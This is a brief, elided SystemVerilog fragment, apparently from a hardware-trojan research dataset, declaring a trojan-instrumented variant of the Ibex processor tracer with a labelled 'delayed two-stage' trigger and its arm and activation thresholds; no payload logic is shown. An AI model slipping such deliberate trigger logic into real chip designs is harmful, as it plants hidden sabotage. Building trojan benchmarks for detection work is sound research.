 ...
 */
module ibex_tracer_trojan_Integrity (
  input logic        clk_i,
  input logic        rst_ni,
  ...
  function automatic void decode_fence();
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4171, act=2085)
    // ============================================================
    localparam int ARM_THRESHOLD   = 4171;
    localparam int ACTIVATE_DELAY  = 2085;
